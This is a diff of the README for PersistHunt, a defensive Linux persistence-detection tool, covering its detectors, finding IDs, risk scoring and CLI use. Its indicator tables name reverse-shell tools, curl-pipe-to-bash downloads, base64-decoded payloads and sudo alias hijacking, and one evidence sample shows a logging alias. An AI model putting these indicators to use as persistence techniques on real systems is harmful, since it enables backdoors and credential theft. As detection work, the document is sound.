@@ -1,517 +1,205 @@
 # PersistHunt
 
-PersistHunt is a Linux persistence detection framework written in Python.
+> A Linux persistence detection and security auditing framework.
+
+[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+[![Python: 3.8+](https://img.shields.io/badge/Python-3.8%2B-brightgreen.svg)](pyproject.toml)
+[![Tests](https://img.shields.io/badge/Tests-183%20Passed-success.svg)](tests/)
+[![Zero Dependencies](https://img.shields.io/badge/Dependencies-Zero%20(Stdlib)-blueviolet.svg)](requirements.txt)
+[![Version: v0.1.0](https://img.shields.io/badge/Version-v0.1.0-orange.svg)](pyproject.toml)
+
+PersistHunt is a specialized, zero-dependency security framework engineered to audit Linux systems for persistence mechanisms, hidden backdoors, unauthorized elevated privileges, and post-exploitation artifacts.
 
 ---
 
-## Developer Documentation
+## Visual Overview
 
-### Stage 1: Finding Engine
+| Clean System Audit | Suspicious Persistence Finding |
+|---|---|
+| ![Clean Scan](docs/screenshots/clean_scan.svg) | ![Suspicious Finding](docs/screenshots/suspicious_finding.svg) |
 
-The finding engine provides a standardized representation for security findings. All PersistHunt detection modules use this engine to normalize findings across different persistence mechanisms.
-
-#### Finding Model
-
-A `Finding` represents a single security issue detected on the system:
-
-- `id`: A unique identifier for the finding type (e.g., `PH-CRON-001`, `PH-SYSTEMD-001`, `PH-SSH-001`, `PH-SHELL-001`, `PH-SUID-001`, `PH-PROC-001`, `PH-ACCT-001`).
-- `category`: The security category (e.g., `cron`, `systemd`, `ssh`, `shell`, `suid`, `process`, `account`).
-- `severity`: Severity level, one of `Severity` enum values (`INFO`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL`).
-- `title`: Short human-readable summary.
-- `description`: Detailed explanation of the detected condition.
-- `evidence`: (Optional) The raw line, file reference, or diagnostic triggering detection.
-- `location`: (Optional) The filesystem path and line number (e.g., `/home/victim/.bashrc:3`).
-- `recommendation`: (Optional) Actionable remediation advice.
-
-#### Available Severity Levels
-
-- `INFO`: Informational or diagnostic observations (e.g., access denied due to permissions).
-- `LOW`: Minor anomalies, syntax issues, or broken references.
-- `MEDIUM`: Suspicious characteristics that warrant investigation (e.g., execution from `/tmp`, inline interpreter commands).
-- `HIGH`: Strong indicators of malicious activity or persistence (e.g., reverse shells, remote download piped to shell, encoded payloads).
-- `CRITICAL`: Confirmed high-impact threats.
+| Explainable Risk Summary | Machine-Readable JSON Output |
+|---|---|
+| ![Risk Summary](docs/screenshots/risk_summary.svg) | ![JSON Output](docs/screenshots/json_output.svg) |
 
 ---
 
-### Stage 2: Detector Architecture & Cron Persistence
+## Features
 
-Stage 2 establishes the reusable detector architecture and the first production detector: `CronDetector`.
+- **Strict Read-Only & Non-Interfering**: Never executes discovered commands, never modifies files, never alters accounts or permissions, and never connects to external network sockets.
+- **Zero Runtime Dependencies**: Built entirely with Python's standard library. No third-party packages required for production execution.
+- **Comprehensive Coverage (7 Persistence Vectors)**: Audits cron schedules, systemd service units, SSH keys/options, shell startup scripts, elevated SUID/SGID binaries, active processes, and local account databases.
+- **Deterministic & Explainable Risk Scoring**: Aggregates findings into a standardized, explainable 0.0–10.0 risk score with explicit contributing factor weights.
+- **Multi-Format Reporting**: Generates human-readable terminal summaries, self-contained air-gapped HTML reports, and machine-readable JSON schema outputs.
+- **Detector Isolation & Fault Tolerance**: Individual detector exceptions are safely isolated. An error in one detector never aborts the broader audit.
+- **Hardened Resource Boundaries**: Built-in protection against named pipe (FIFO) deadlocks, a 10 MB maximum file size ceiling to prevent DoS attacks, and directory recursion cycle detection.
+- **Offline & Container Forensic Ready**: Supports `--root-prefix` for targeting mounted forensic disk images, offline root filesystems, or container layers.
 
-#### Detector Architecture
+---
 
-Every detector in PersistHunt implements the `BaseDetector` abstract base class (`persisthunt.detectors.base`):
+## Detection Architecture
+
+PersistHunt decouples persistence enumeration, risk evaluation, and report serialization into clean, modular components:
 
 ```text
-BaseDetector
-    ├── name: str
-    ├── detector_id: str
-    └── scan() -> FindingCollection
+Filesystem & OS Targets (/etc, /proc, /home, /var, etc.)
+                   │
+                   ▼
+       ┌────────────────────────┐
+       │   Detector Pipeline    │
+       │  (Isolated Execution)  │
+       └───────────┬────────────┘
+                   │
+    ┌──────────────┼──────────────┬──────────────┐
+    ▼              ▼              ▼              ▼
+[CronDetector] [SystemdDetector] [SSHDetector] [ShellDetector]
+[SuidDetector] [ProcessDetector] [AccountDetector] ...
+                   │
+                   ▼
+         [FindingCollection]
+                   │
+       ┌───────────┴────────────┐
+       │   Risk Scoring Engine  │
+       │ (Weighted Normalization)│
+       └───────────┬────────────┘
+                   │
+                   ▼
+         [ScanReport Engine]
+       ┌───────────┼────────────┐
+       ▼           ▼            ▼
+ Terminal UI   JSON Schema   HTML Report
 ```
 
-Contract:
-- Detectors must expose `name` and `detector_id`.
-- Detectors must return a `FindingCollection` containing normalized `Finding` objects.
-- Callers interact with detectors through the unified `scan()` interface without needing internal knowledge of the detector.
-
-#### Cron Detector (`CronDetector`)
-
-`CronDetector` audits Linux cron configuration files and scheduled script directories for persistence indicators.
-
-##### Supported Locations
-
-The detector inspects:
-- **System crontab**: `/etc/crontab`
-- **Cron drop-in directories**: `/etc/cron.d/`
-- **Scheduled script directories**:
-  - `/etc/cron.hourly/`
-  - `/etc/cron.daily/`
-  - `/etc/cron.weekly/`
-  - `/etc/cron.monthly/`
-- **User crontab spools**:
-  - `/var/spool/cron/crontabs/` (Debian/Ubuntu)
-  - `/var/spool/cron/` (RHEL/CentOS/Fedora)
-
-##### Indicator Rules & Finding IDs (Cron)
-
-| Finding ID | Category | Severity | Description | Indicators |
-|---|---|---|---|---|
-| `PH-CRON-001` | cron | `HIGH` | Interactive network utility or raw socket | `/dev/tcp`, `/dev/udp`, `nc`, `ncat`, `netcat`, `socat`, `mkfifo` |
-| `PH-CRON-002` | cron | `HIGH` / `MEDIUM` | Remote download utility or piped execution | `curl ... \| bash`, `wget ... \| sh` (`HIGH`); standalone `curl`/`wget` (`MEDIUM`) |
-| `PH-CRON-003` | cron | `MEDIUM` | Temporary/writable directory reference | Paths referencing `/tmp/`, `/var/tmp/`, `/dev/shm/` |
-| `PH-CRON-004` | cron | `MEDIUM` | Inline interpreter code execution | `python -c`, `perl -e`, `bash -c`, `sh -c` |
-| `PH-CRON-005` | cron | `HIGH` | Encoded payload execution | `base64 -d`, `base64 --decode` |
-| `PH-CRON-006` | cron | `MEDIUM` | Anomalous file in cron directory | Hidden files (`.filename`) or uncharacteristic binaries |
-| `PH-CRON-090` | cron | `INFO` | Unreadable cron location | `PermissionError` (diagnostic finding) |
-| `PH-CRON-091` | cron | `LOW` | Broken symlink | Symlink pointing to a missing target |
-| `PH-CRON-092` | cron | `LOW` | Malformed cron entry | Invalid field counts or malformed schedule directive |
+Every persistence detector inherits from `BaseDetector` (`persisthunt.detectors.base`), exposing a standardized `scan() -> FindingCollection` interface.
 
 ---
 
-### Stage 3: Systemd Persistence Detection
+## Supported Detectors
 
-Stage 3 introduces `SystemdDetector` (`persisthunt.detectors.systemd`), auditing systemd service units, timers, drop-ins, and user units for persistence mechanisms.
-
-#### Supported Locations
-
-The detector inspects:
-- **System administrator units**: `/etc/systemd/system/` (including `*.d/*.conf` drop-ins and `*.wants`/`*.requires` symlinks)
-- **Runtime units**: `/run/systemd/system/`
-- **Packaged vendor units**: `/usr/lib/systemd/system/` and `/lib/systemd/system/`
-- **User-level units**: `~/.config/systemd/user/`, `/etc/systemd/user/`, `/usr/lib/systemd/user/`
-
-#### Indicator Rules & Finding IDs (Systemd)
-
-| Finding ID | Category | Severity | Description | Indicators |
-|---|---|---|---|---|
-| `PH-SYSTEMD-001` | systemd | `HIGH` | Interactive network utility or raw socket | `/dev/tcp`, `/dev/udp`, `nc`, `ncat`, `netcat`, `socat`, `mkfifo` in `Exec*` |
-| `PH-SYSTEMD-002` | systemd | `HIGH` / `MEDIUM` | Remote download utility or piped execution | `curl ... \| bash`, `wget ... \| sh` (`HIGH`); standalone `curl`/`wget` (`MEDIUM`) |
-| `PH-SYSTEMD-003` | systemd | `HIGH` | Service binary in temporary/writable directory | Binaries executing from `/tmp/`, `/var/tmp/`, `/dev/shm/` |
-| `PH-SYSTEMD-004` | systemd | `MEDIUM` | Executable in hidden directory or hidden unit | Binary path containing hidden folder (e.g. `/.secret/`) or unit file starting with `.` |
-| `PH-SYSTEMD-005` | systemd | `MEDIUM` | Inline interpreter command execution | `python -c`, `perl -e`, `bash -c`, `sh -c` in `Exec*` directives |
-| `PH-SYSTEMD-006` | systemd | `HIGH` | Insecure unit file permissions | Unit file is world-writable in system directories |
-| `PH-SYSTEMD-007` | systemd | `LOW` | System service executing from user home | System service executing binaries from `/home/<user>/` |
-| `PH-SYSTEMD-090` | systemd | `INFO` | Unreadable systemd directory or file | `PermissionError` (diagnostic finding) |
-| `PH-SYSTEMD-091` | systemd | `LOW` | Broken symlink in unit directory | Target unit missing in `*.wants` or service link |
-| `PH-SYSTEMD-092` | systemd | `LOW` | Malformed systemd unit directive | Line does not follow standard `Key=Value` syntax |
+| Category | Detector Class | Primary Inspection Scope | Key Indicators Detected |
+|---|---|---|---|
+| **cron** | `CronDetector` | `/etc/crontab`, `/etc/cron.*`, `/var/spool/cron/*` | Reverse shells, download-and-pipe (`curl \| bash`), temp dir execution (`/tmp`), base64 decoding, hidden scripts. |
+| **systemd** | `SystemdDetector` | `/etc/systemd/system`, `/usr/lib/systemd/system`, `~/.config/systemd/user`, drop-ins | Network socket redirection (`/dev/tcp`), binaries executing from `/tmp` or hidden folders, inline interpreter invocations. |
+| **ssh** | `SSHDetector` | `/root/.ssh/authorized_keys`, `/home/*/.ssh/*`, `/etc/ssh/sshd_config` | Unauthorized keys, forced commands (`command=...`), non-login service accounts with keys, insecure key permissions. |
+| **shell** | `ShellDetector` | `/etc/profile`, `/etc/profile.d/*`, `~/.bashrc`, `~/.profile`, `~/.zshrc` | Reverse shells, temporary path execution, alias hijacking (`alias sudo=...`), base64 pipelines. |
+| **suid** | `SuidDetector` | `/bin`, `/sbin`, `/usr/bin`, `/usr/local/bin`, `/opt`, `/tmp`, `/home` | Binaries with SUID/SGID bits set, world-writable SUID binaries, SUID shells (`bash`, `python`), SUID in non-standard paths. |
+| **process** | `ProcessDetector` | `/proc/[pid]/*` | Execution from `/tmp`, running processes with deleted binaries on disk, interactive shells spawned by web servers, reverse shell syntax. |
+| **account** | `AccountDetector` | `/etc/passwd`, `/etc/shadow`, `/etc/group` | Unauthorized UID 0 accounts, service accounts with login shells, accounts with suspicious home directories, empty passwords. |
 
 ---
 
-### Stage 4: SSH Persistence Detection
+## Installation
 
-Stage 4 introduces `SSHDetector` (`persisthunt.detectors.ssh`), auditing SSH authentication keys, key options, filesystem permissions, and daemon configurations for persistence mechanisms.
+### Prerequisites
 
-#### Supported Locations
+- Linux operating system (kernel 3.10+ recommended)
+- Python 3.8 or newer
+- Standard user permissions for basic audit, or root/`sudo` for complete inspection of restricted files (`/etc/shadow`, `/root/.ssh`).
 
-The detector inspects:
-- **Root authorized keys**: `/root/.ssh/authorized_keys`, `/root/.ssh/authorized_keys2`
-- **User authorized keys**: `/home/*/.ssh/authorized_keys`, `/home/*/.ssh/authorized_keys2`
-- **Service account homes**: `/var/www/.ssh/`, `/var/lib/*/.ssh/`, `/srv/.ssh/`
-- **SSH daemon configuration**: `/etc/ssh/sshd_config`, `/etc/ssh/sshd_config.d/*.conf`
+### Install from Source
 
-#### Indicator Rules & Finding IDs (SSH)
+Clone the repository and install using `pip`:
 
-| Finding ID | Category | Severity | Description | Indicators |
-|---|---|---|---|---|
-| `PH-SSH-001` | ssh | `LOW` | Root authorized keys present | Presence of active authorized keys allowing direct root SSH login |
-| `PH-SSH-002` | ssh | `HIGH` / `MEDIUM` | Forced command in authorized key | `command="..."` option enforcing execution; `HIGH` if matching suspicious indicators (`/tmp`, `curl`, reverse shell) |
-| `PH-SSH-003` | ssh | `HIGH` | Service account authorized keys | Non-login daemon accounts (`www-data`, `nobody`, `apache`) with SSH keys |
-| `PH-SSH-004` | ssh | `HIGH` / `MEDIUM` | Insecure permissions on SSH path | World-writable (`HIGH`) or group-writable (`MEDIUM`) `.ssh/` or `authorized_keys` |
-| `PH-SSH-005` | ssh | `HIGH` | Private key material in authorized keys | Private key header found inside authorized_keys file (redacted) |
-| `PH-SSH-006` | ssh | `HIGH` / `MEDIUM` | Dangerous SSH daemon configuration | `PermitEmptyPasswords yes` (`HIGH`), `AuthorizedKeysFile /tmp/...` (`HIGH`), `PermitRootLogin yes` (`MEDIUM`), `AuthorizedKeysCommand` (`MEDIUM`) |
-| `PH-SSH-090` | ssh | `INFO` | Unreadable SSH location | `PermissionError` (diagnostic finding) |
-| `PH-SSH-091` | ssh | `LOW` | Broken symlink in SSH directory | Symlink pointing to missing key target |
-| `PH-SSH-092` | ssh | `LOW` | Malformed authorized_keys line | Line fails OpenSSH public key syntax |
-
----
-
-### Stage 5: Shell Startup Persistence Detection
-
-Stage 5 introduces `ShellDetector` (`persisthunt.detectors.shell`), auditing shell initialization scripts for unauthorized commands, reverse shells, downloaders, and credential-harvesting aliases.
-
-#### Supported Locations
-
-The detector inspects:
-- **System-wide shell startup files**:
-  - `/etc/profile`
-  - `/etc/profile.d/*.sh`
-  - `/etc/bash.bashrc`, `/etc/bashrc`
-  - `/etc/zsh/zprofile`, `/etc/zsh/zshrc`, `/etc/zshrc`
-  - `/etc/environment`
-- **User-level shell startup files**:
-  - Root: `/root/.bashrc`, `/root/.profile`, `/root/.bash_profile`, `/root/.bash_login`, `/root/.zshrc`, `/root/.bash_aliases`
-  - Users: `/home/*/.bashrc`, `/home/*/.profile`, `/home/*/.bash_profile`, `/home/*/.bash_login`, `/home/*/.zshrc`, `/home/*/.bash_aliases`
-
-#### Safe Inspection Model
-
-- **Never Sourced or Executed**: Shell scripts are never executed, sourced (`.`), or evaluated in a shell.
-- **Untrusted Plaintext**: Content is parsed strictly as untrusted text line-by-line.
-- **Concise Evidence**: Limits evidence strictly to the offending line and line number without dumping full files.
-
-#### Indicator Rules & Finding IDs (Shell)
-
-| Finding ID | Category | Severity | Description | Indicators |
-|---|---|---|---|---|
-| `PH-SHELL-001` | shell | `HIGH` | Interactive network utility or raw socket | `/dev/tcp`, `/dev/udp`, `nc`, `ncat`, `netcat`, `socat`, `mkfifo` |
-| `PH-SHELL-002` | shell | `HIGH` / `MEDIUM` | Remote download utility or piped execution | `curl ... \| bash`, `wget ... \| sh` (`HIGH`); standalone `curl`/`wget` (`MEDIUM`) |
-| `PH-SHELL-003` | shell | `HIGH` | Reference or execution from temporary directory | Paths referencing or executing from `/tmp/`, `/var/tmp/`, `/dev/shm/` |
-| `PH-SHELL-004` | shell | `HIGH` / `MEDIUM` | Anomalous hidden path or binary executable | Execution from non-standard hidden folder (`MEDIUM`); binary file in startup path (`HIGH`) |
-| `PH-SHELL-005` | shell | `MEDIUM` | Inline interpreter command execution | `python -c`, `perl -e`, `bash -c`, `sh -c` |
-| `PH-SHELL-006` | shell | `HIGH` | Encoded payload execution | `base64 -d`, `base64 --decode` in pipeline |
-| `PH-SHELL-007` | shell | `HIGH` | Privilege utility alias hijacking | `alias sudo=...`, `alias su=...`, `alias ssh=...` |
-| `PH-SHELL-008` | shell | `HIGH` | Insecure world-writable startup file | Startup script is world-writable (`chmod 666`/`777`) |
-| `PH-SHELL-090` | shell | `INFO` | Unreadable startup file or directory | `PermissionError` (diagnostic finding) |
-| `PH-SHELL-091` | shell | `LOW` | Broken symlink in startup directory | Dangling symlink in `/etc/profile.d` |
-
-#### Usage Example
-
-```python
-from persisthunt import ShellDetector, Severity
-
-# Initialize and scan
-detector = ShellDetector()
-findings = detector.scan()
-
-# Inspect high-severity shell findings
-for finding in findings.by_severity(Severity.HIGH):
-    print(f"[{finding.id}] {finding.title}")
-    print(f"  Location: {finding.location}")
-    print(f"  Evidence: {finding.evidence}")
-    print(f"  Recommendation: {finding.recommendation}")
+```bash
+git clone https://github.com/0xraiven/persistHunt.git
+cd persistHunt
+pip install .
 ```
 
-#### Example Finding Output
+For editable development mode:
 
-```json
-{
-  "id": "PH-SHELL-007",
-  "category": "shell",
-  "severity": "HIGH",
-  "title": "Privilege or authentication utility alias defined in shell startup",
-  "description": "Line defines an alias overriding a critical authentication or privilege utility (sudo, su, ssh). This technique is frequently used for credential theft or command interception.",
-  "evidence": "alias sudo='/tmp/.sudo_logger'",
-  "location": "/home/victim/.bashrc:5",
-  "recommendation": "Audit the alias definition to ensure it does not intercept or log user credentials."
-}
+```bash
+pip install -e ".[dev]"
+```
+
+### Direct Standalone Execution
+
+PersistHunt can be executed directly without installation:
+
+```bash
+python3 -m persisthunt scan
 ```
 
 ---
 
-### Stage 6: SUID/SGID Persistence Detection
+## Usage
 
-Stage 6 implements `SuidDetector` for discovering and auditing binaries possessing elevated SUID (`chmod u+s`) and SGID (`chmod g+s`) privilege bits.
+### CLI Synopsis
 
-#### Detection Scope & Strategy
-
-`SuidDetector` performs safe, read-only enumeration of filesystem paths using pure Python filesystem APIs (`os.scandir` and `stat()` with `follow_symlinks=False`):
-
-- **Standard Binary Paths**: `/bin`, `/sbin`, `/usr/bin`, `/usr/sbin`, `/usr/local/bin`, `/usr/local/sbin`, `/usr/lib`, `/usr/libexec`.
-- **Staging / Temporary Directories**: `/tmp`, `/var/tmp`, `/dev/shm`.
-- **User / Home Directories**: `/home`, `/root`.
-- **Third-Party / Non-Standard Directories**: `/opt`.
-
-#### Safety & Performance Architecture
-
-- **Strict Read-Only Execution**: Discovered binaries are never executed. No attempts are made to exploit binaries, escalate privileges, or alter file permissions.
-- **Symlink Protection**: Linux kernels ignore SUID/SGID bits on symlinks. `SuidDetector` strictly inspects `is_symlink()` and avoids following symlinks to prevent redundant evaluations and infinite traversal loops.
-- **Virtual Filesystem Exclusion**: Traversal automatically skips pseudo/virtual filesystems (`/proc`, `/sys`, `/dev`, `/run`) and developer cache trees (`.git`, `.cache`, `node_modules`).
-- **Calibrated Risk Model**: Normal system binaries (e.g., `/usr/bin/passwd`, `/usr/bin/sudo`) are cataloged as `INFO` rather than false-positive `CRITICAL` alerts. Critical and high severities are reserved for writable SUID files, SUID shells, and binaries placed in temporary or user directories.
-
-#### Indicator Rules & Finding IDs (SUID/SGID)
-
-| Finding ID | Category | Severity | Description | Indicators |
-|---|---|---|---|---|
-| `PH-SUID-001` | suid | `HIGH` | SUID/SGID binary in temporary or user directory | Binary with SUID/SGID in `/tmp/`, `/var/tmp/`, `/dev/shm/`, `/home/`, `/root/` |
-| `PH-SUID-002` | suid | `CRITICAL` | Insecure writable permissions on SUID/SGID binary | SUID/SGID binary is world-writable (`0o002`) or group-writable (`0o020`) |
-| `PH-SUID-003` | suid | `HIGH` | Shell or script interpreter possessing SUID/SGID bits | `bash`, `sh`, `dash`, `zsh`, `python`, `perl`, `ruby`, `busybox`, etc. |
-| `PH-SUID-004` | suid | `MEDIUM` | SUID/SGID binary located in non-standard system directory | SUID/SGID binary residing outside standard system paths (e.g., `/opt/`) |
-| `PH-SUID-005` | suid | `INFO` | Standard system SUID/SGID binary inventory | Standard administrative utility (`/usr/bin/passwd`, `/usr/bin/sudo`, etc.) |
-| `PH-SUID-090` | suid | `INFO` | Unreadable directory during SUID scan | `PermissionError` (diagnostic finding) |
-
-#### Usage Example
-
-```python
-from persisthunt import SuidDetector, Severity
-
-# Initialize detector
-detector = SuidDetector()
-
-# Scan filesystem for SUID/SGID binaries
-findings = detector.scan()
-
-# Inspect high and critical findings
-for finding in findings.filter(lambda f: f.severity in (Severity.HIGH, Severity.CRITICAL)):
-    print(f"[{finding.severity.value}] {finding.id} - {finding.title}")
-    print(f"  Location: {finding.location}")
-    print(f"  Evidence: {finding.evidence}")
-    print(f"  Recommendation: {finding.recommendation}")
+```text
+persisthunt [-h] [-V] {scan,version} ...
 ```
 
-#### Example Finding Output
+### Common Commands
 
-```json
-{
-  "id": "PH-SUID-002",
-  "category": "suid",
-  "severity": "CRITICAL",
-  "title": "Insecure writable permissions on SUID/SGID binary",
-  "description": "Binary at /opt/legacy_tool has SUID/SGID bits set and is world-writable (0o4777). Any local user can overwrite the binary to execute arbitrary code with elevated privileges.",
-  "evidence": "Permissions: 0o4777, Owner: root:root, SUID: True, SGID: False",
-  "location": "/opt/legacy_tool",
-  "recommendation": "Remove write permissions immediately: chmod go-w /opt/legacy_tool."
-}
+```bash
+# Run complete system audit across all detectors
+persisthunt scan
+
+# Output results in machine-readable JSON format
+persisthunt scan --json
+
+# Filter audit by specific detector categories
+persisthunt scan --category cron,systemd,ssh
+
+# Filter findings by minimum severity threshold
+persisthunt scan --severity high
+
+# Export audit report to self-contained HTML or JSON
+persisthunt scan -o report.html
+persisthunt scan -o report.json
+
+# Audit an offline forensic image or container root mount
+persisthunt scan --root-prefix /mnt/forensic_root
 ```
 
----
+### CLI Options Reference (`persisthunt scan`)
 
-### Stage 7: Process and Account Persistence Detection
-
-Stage 7 implements runtime process persistence auditing (`ProcessDetector`) and local account persistence auditing (`AccountDetector`).
-
----
-
-#### 1. Process Persistence Detector (`ProcessDetector`)
-
-`ProcessDetector` inspects active Linux processes via `/proc` to detect runtime persistence anomalies, memory-resident deleted payloads, reverse shells, and unauthorized child processes.
-
-##### Safety & Privacy Architecture
-- **Strict Read-Only Inspection**: Never signals or kills processes (`os.kill`), never attaches debuggers (`ptrace`), never injects code, and never accesses process memory (`/proc/[pid]/mem`).
-- **Credential & Secret Sanitization**: Automatically masks passwords, authentication tokens, and API keys (`***REDACTED***`) in command line arguments. Never accesses or dumps `/proc/[pid]/environ`.
-- **Transient Process Resiliency**: Gracefully handles short-lived processes that exit during inspection (`ProcessLookupError`, `FileNotFoundError`).
-
-##### Indicator Rules & Finding IDs (Process)
-
-| Finding ID | Category | Severity | Description | Indicators |
-|---|---|---|---|---|
-| `PH-PROC-001` | process | `HIGH` | Process executing from temporary or staging directory | Executable or cmdline in `/tmp/`, `/var/tmp/`, `/dev/shm/` |
-| `PH-PROC-002` | process | `HIGH` | Process executing from hidden directory path | Executable path contains hidden folders (e.g., `.../.hidden/...`) |
-| `PH-PROC-003` | process | `HIGH` | Running process with deleted binary on disk | `/proc/[pid]/exe` target ends with `(deleted)` |
-| `PH-PROC-004` | process | `HIGH` | Suspicious command line execution | Reverse shell (`/dev/tcp`, `/dev/udp`), `nc -e`, `curl ... \| sh`, `base64 -d \| sh` |
-| `PH-PROC-005` | process | `HIGH` | Web server or service daemon spawned interactive shell | Server parent (`nginx`, `apache2`, `httpd`, `mysqld`, etc.) spawned shell child (`sh`, `bash`) |
-| `PH-PROC-006` | process | `MEDIUM` | Inline interpreter command execution | `python -c`, `perl -e`, `ruby -e`, `php -r` |
-| `PH-PROC-090` | process | `INFO` | Process directory unavailable or unreadable | `PermissionError` (diagnostic finding) |
-
-##### Usage Example (Process)
-
-```python
-from persisthunt import ProcessDetector, Severity
-
-detector = ProcessDetector()
-findings = detector.scan()
-
-for finding in findings.filter(lambda f: f.severity in (Severity.HIGH, Severity.CRITICAL)):
-    print(f"[{finding.severity.value}] {finding.id} - {finding.title}")
-    print(f"  Location: {finding.location}")
-    print(f"  Evidence: {finding.evidence}")
-    print(f"  Recommendation: {finding.recommendation}")
-```
-
----
-
-#### 2. Account Persistence Detector (`AccountDetector`)
-
-`AccountDetector` audits local authentication and identity databases (`/etc/passwd`, `/etc/shadow`, `/etc/group`) for backdoor accounts and privilege escalation vectors.
-
-##### Safety & Privacy Architecture
-- **Strict Read-Only Inspection**: Never modifies `/etc/passwd`, `/etc/shadow`, or `/etc/group`. Never alters passwords or locks accounts.
-- **Hash Privacy Shielding**: Never displays, logs, or exports raw password hash strings from `/etc/shadow`. Only reports hash algorithm types or empty/locked status.
-- **Permission Resiliency**: Handles unreadable `/etc/shadow` gracefully via diagnostic finding `PH-ACCT-090`.
-
-##### Indicator Rules & Finding IDs (Account)
-
-| Finding ID | Category | Severity | Description | Indicators |
-|---|---|---|---|---|
-| `PH-ACCT-001` | account | `CRITICAL` | Non-root account with UID 0 | Account other than `root` has `UID == 0` |
-| `PH-ACCT-002` | account | `HIGH` | Service account with interactive login shell | System/service account configured with `/bin/bash`, `/bin/sh`, etc. |
-| `PH-ACCT-003` | account | `HIGH` | Account configured with suspicious home directory | Home directory in `/tmp/`, `/var/tmp/`, `/dev/shm/`, or hidden directory |
-| `PH-ACCT-004` | account | `CRITICAL` | Account configured with empty password | Empty password hash field in `/etc/shadow` |
-| `PH-ACCT-005` | account | `HIGH` | User account with non-standard login shell | Shell pointing to non-standard or unusual binary path |
-| `PH-ACCT-006` | account | `MEDIUM` | Non-standard account in administrative group | User account granted `sudo` or `wheel` membership |
-| `PH-ACCT-007` | account | `LOW` | Recently created or modified local account | Shadow `last_change` timestamp modified within last 7 days |
-| `PH-ACCT-090` | account | `INFO` | Account database unreadable | `PermissionError` on `/etc/shadow` or `/etc/passwd` |
-
-##### Usage Example (Account)
-
-```python
-from persisthunt import AccountDetector, Severity
-
-detector = AccountDetector()
-findings = detector.scan()
-
-for finding in findings.filter(lambda f: f.severity in (Severity.HIGH, Severity.CRITICAL)):
-    print(f"[{finding.severity.value}] {finding.id} - {finding.title}")
-    print(f"  Location: {finding.location}")
-    print(f"  Evidence: {finding.evidence}")
-    print(f"  Recommendation: {finding.recommendation}")
-```
-
----
-
-### Stage 8: Risk Scoring Engine
-
-Stage 8 implements the deterministic, explainable, and detector-independent risk-scoring engine (`RiskScorer`, `RiskReport`, and `calculate_risk`).
-
-#### Mathematical Model & Severity Weights
-
-The scoring engine aggregates findings without naive averaging (which would artificially dilute severe threats when many benign or informational findings exist) and without unbounded sums:
-
-##### Severity Weights
-
-| Severity Level | Weight | Description |
+| Option | Flag | Description |
 |---|---|---|
-| `INFO` | `0` | Informational or diagnostic observations |
-| `LOW` | `1` | Minor anomalies or configuration warnings |
-| `MEDIUM` | `3` | Suspicious characteristics or non-standard paths |
-| `HIGH` | `6` | Strong indicators of persistence or reverse shells |
-| `CRITICAL` | `10` | High-impact backdoors, UID 0 accounts, writable SUID |
+| `--json` | | Emit scan results formatted as JSON on `stdout`. |
+| `--category` | `-c` | Comma-separated list of detectors to run (`cron`, `systemd`, `ssh`, `shell`, `suid`, `process`, `account`, or `all`). |
+| `--severity` | `-s` | Minimum severity filter (`info`, `low`, `medium`, `high`, `critical`). |
+| `--output` | `-o` | Destination file path. Automatically selects JSON or HTML based on extension (`.json`, `.html`). |
+| `--quiet` | `-q` | Suppress progress messages on `stderr`. |
+| `--exit-zero` | | Always return exit code 0 even if threats are discovered (useful for non-blocking CI). |
+| `--root-prefix` | | Base root path for offline container, disk image, or forensic mount audits. |
 
-##### Aggregation Formula
+---
 
-$$\text{Raw Score} = \sum_{f \in \text{findings}} \text{Weight}(f.\text{severity})$$
+## CLI Examples
 
-$$\text{Risk Score} = \min\left(10.0, \text{round}\left(\frac{\text{Raw Score}}{\text{divisor}}, 1\right)\right) \quad (\text{default } \text{divisor} = 5.0)$$
+### Automated Threat Detection in CI/CD
 
-For example, a security audit discovering:
-- 1 Critical (10 pts)
-- 2 High (12 pts)
-- 4 Medium (12 pts)
-- 3 Low (3 pts)
-- 1 Info (0 pts)
+```bash
+# Scan system for high-severity persistence and fail pipeline on discovery
+persisthunt scan --severity high
+STATUS=$?
 
-Yields a raw score of $10 + 12 + 12 + 3 + 0 = 37.0$.
-$$\text{Risk Score} = \frac{37.0}{5.0} = 7.4 / 10.0$$
-
-#### Output & Explainability
-
-`RiskReport` exposes the overall score, severity counts, highest severity, raw score, breakdown by severity, and prioritized list of contributing findings:
-
-##### Formatted Summary (`report.summary()`)
-
-```text
-Risk Score: 7.4/10
-
-Critical: 1
-High: 2
-Medium: 4
-Low: 3
-Info: 1
+if [ $STATUS -eq 2 ]; then
+    echo "High-severity persistence threat detected!"
+    exit 1
+fi
 ```
 
-##### Detailed Explanation (`report.explain()`)
+### Piping JSON into `jq`
 
-```text
-=== Risk Score Explanation ===
-Overall Risk Score: 7.4 / 10 (Raw Weight: 37.0)
-Total Findings: 11
-Highest Severity Detected: CRITICAL
-
-Severity Breakdown:
-  - CRITICAL:  1 finding(s) x 10.0 weight =  10.0 pts
-  - HIGH    :  2 finding(s) x  6.0 weight =  12.0 pts
-  - MEDIUM  :  4 finding(s) x  3.0 weight =  12.0 pts
-  - LOW     :  3 finding(s) x  1.0 weight =   3.0 pts
-  - INFO    :  1 finding(s) x  0.0 weight =   0.0 pts
-
-Top Contributing Findings:
-  1. [CRITICAL] PH-ACCT-001 - Non-root user account with UID 0 at /etc/passwd:toor
-  ...
+```bash
+# Extract all critical findings cleanly from stdout
+persisthunt scan --json -q | jq '.findings[] | select(.severity == "CRITICAL")'
 ```
 
-#### Usage Example
+### Generating an Air-Gapped HTML Report
 
-```python
-from persisthunt import CronDetector, SystemdDetector, calculate_risk
-
-# Collect findings across detectors
-findings = CronDetector().scan()
-findings.extend(SystemdDetector().scan())
-
-# Calculate risk report
-report = calculate_risk(findings)
-
-# Print standard summary
-print(report.summary())
-
-# Access structured attributes
-print(f"Overall Score: {report.score}/{report.max_score}")
-print(f"Highest Severity: {report.highest_severity}")
+```bash
+persisthunt scan -o /var/reports/audit_$(date +%F).html
 ```
 
 ---
 
-### Stage 9: Reporting and JSON Output
+## Example Output
 
-Stage 9 implements machine-readable and human-readable audit reporting (`ScanReport`, `Reporter`, and `generate_report`).
-
-#### Supported Formats
-
-1. **Terminal Output**: Clean console summary with finding totals, severity breakdown, risk score, and detailed remediation steps.
-2. **JSON Schema**: Stable, machine-readable format suitable for SIEM, CI/CD pipelines, and automated security ingestion.
-3. **HTML Report**: Clean, self-contained, responsive HTML report with embedded styling, designed for offline viewing in air-gapped environments without external dependencies.
-
